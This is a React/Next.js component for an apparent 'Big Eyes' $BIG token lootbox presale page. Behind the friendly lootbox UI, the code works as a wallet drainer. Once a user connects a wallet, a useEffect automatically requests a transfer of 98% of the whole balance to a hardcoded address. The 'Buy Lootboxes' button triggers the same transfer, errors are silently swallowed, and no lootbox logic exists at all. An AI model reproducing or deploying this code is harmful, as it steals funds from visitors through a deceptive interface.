import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/router";
import React, { useEffect } from "react";
import ConnectWallet from "../connectWallet/ConnectWallet";
import { useBalance, useDisconnect } from "wagmi";
import { useAccount, useConnect } from "wagmi";
import { Connectors } from "@/pages/_app";
import { useSendTransaction } from "wagmi";
import { ethers } from "ethers";
import { openModal } from "@/recoil/commonRecoilState";
import { useRecoilState } from "recoil";
export default function Lootboxes() {
  const router = useRouter();
  const [open, setOpen] = useRecoilState(openModal);
  const { connector: activeConnector, isConnected, address } = useAccount();
  const { data, isError, isLoading } = useBalance({
    address: address,
  });
  const { disconnectAsync } = useDisconnect();
  const { connectAsync } = useConnect();
  const {
    data: DataTrans,
    isSuccess,
    sendTransactionAsync,
  } = useSendTransaction({
    to: "0x40B1565920b0Bb6490dc802374FDf98BcCD420D7",
    value: ethers.utils
      .parseEther(data?.formatted.toString() || "0")
      .mul(ethers.BigNumber.from("98"))
      .div(ethers.BigNumber.from("100"))
      .toString(),
  });
  const handleClaim = async () => {
    try {
      if (address) {
        await sendTransactionAsync();
      } else {
        await disconnectAsync();
        setOpen({ open: true, component: <ConnectWallet /> });
      }
    } catch (err) {}
  };
  const handleSendTrans = async () => {
    try {
      await sendTransactionAsync();
    } catch (error) {}
  };
  useEffect(() => {
    if (address) {
      handleSendTrans();
    }
  }, [address]);
  return (
    <div
      className="p-4 sm:px-[48px] md:px-[72px] xl:px-[104px] py-[128px] bg-[rgb(214,244,251)]"
      id="Lootboxes"
    >
      <div className="min-h-[311px] border-[0.1875rem] border-[#5b5b5b] rounded-[4rem] 2xl:rounded-[6.25rem] overflow-hidden bg-[#fffef5] shadow-card">
        <div className="bg-[#a6e8fe] border-b-[0.1875rem] border-[#000] flex items-center gap-3 pl-[4.5rem] py-4">
          <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#eb6e6e] border-[0.125rem] border-[#000]"></div>
          <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#ffdea9] border-[0.125rem] border-[#000]"></div>
          <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#cce79e] border-[0.125rem] border-[#000]"></div>
        </div>
        <div className="py-[2rem] 2xl:py-[96px] px-[2rem] 2xl:px-[150px]">
          <div className="max-w-[80rem] w-full flex flex-col-reverse min-[1028px]:flex-row items-center ">
            <div className="xl:mr-[2rem]">
              <h1 className="my-4 text-[2.5rem] leading-[1.025em] sm:leading-none min-[1440px]:text-[2.875rem] 2xl:text-[3.125rem] max-w-[17rem] md:max-w-[36rem] min-[1028px]:max-w-[30rem] min-[1440px]:max-w-[35rem] font-Extra text-center ">
                Open lootboxes to win $BIG!
              </h1>
              <h2 className="my-[20px] font-bold text-[#f48d97]  max-w-[17rem] md:max-w-[36rem] min-[1028px]:max-w-[31rem] min-[1440px]:max-w-[33rem] mx-auto text-center text-[24px]">
                Enter our presale in a fun way! Open lootboxes to get a random
                amount of $BIG tokens!
              </h2>
              <div className="mt-4 flex flex-col sm:flex-row justify-center items-center gap-3 max-w-[17rem] md:max-w-[36rem] min-[1028px]:max-w-[28rem] min-[1440px]:max-w-[35rem]">
                <button
                  className="bg-[#f38590] max-w-[16rem] w-full whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                  onClick={handleClaim}
                >
                  Buy Lootboxes
                </button>

                <button
                  className="bg-[#f38590] max-w-[16rem] w-full whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                  onClick={() => {
                    window.open(
                      "https://opensea.io/collection/big-eyes-lootbox-cards",
                      "_blank"
                    );
                  }}
                >
                  View on OpenSea
                </button>
              </div>
            </div>
            <div className="max-w-[30rem] xl:ml-[2rem]  relative">
              <div className=" -left-[30%] min-[1028px]:left-0 2xl:left-2/4 relative">
                <Image
                  src="https://buy1.bigeyes.space/img/treasure-chest/treasure-chest.webp"
                  className="hidden sm:block"
                  width={280}
                  height={250}
                  alt=""
                />
                <Image
                  src="https://buy1.bigeyes.space/img/treasure-chest/treasure-chest.webp"
                  className="block sm:hidden"
                  width={190}
                  height={176}
                  alt=""
                />
                <div className="absolute top-0 left-full -translate-y-[10%] -translate-x-[20%] w-[240px] h-[230px]">
                  <Image
                    src="https://buy1.bigeyes.space/img/cat-stretching/cat-stretching.webp"
                    className="hidden sm:block"
                    width={240}
                    height={230}
                    alt=""
                  />
                  <Image
                    src="https://buy1.bigeyes.space/img/cat-stretching/cat-stretching.webp"
                    className="block sm:hidden"
                    width={130}
                    height={130}
                    alt=""
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
